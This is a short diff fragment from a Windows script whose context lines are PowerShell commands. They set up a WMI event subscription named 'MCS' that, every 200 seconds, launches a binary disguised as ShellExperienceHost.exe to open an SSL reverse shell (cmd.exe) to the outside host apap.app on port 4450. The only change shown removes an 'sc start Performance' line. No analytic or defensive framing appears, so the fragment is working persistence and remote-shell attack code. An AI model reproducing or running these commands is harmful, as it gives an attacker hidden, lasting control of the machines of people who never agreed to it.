@@ -42,4 +42,3 @@ powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='MCS'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 200 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='MCS'; CommandLineTemplate='%ProgramData%\config..\ShellExperienceHost.exe --ssl apap.app 4450 -e cmd.exe'} | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='__EventFilter.Name=\"MCS\"'; Consumer='CommandLineEventConsumer.Name=\"MCS\"'} | Out-Null"
-sc start Performance
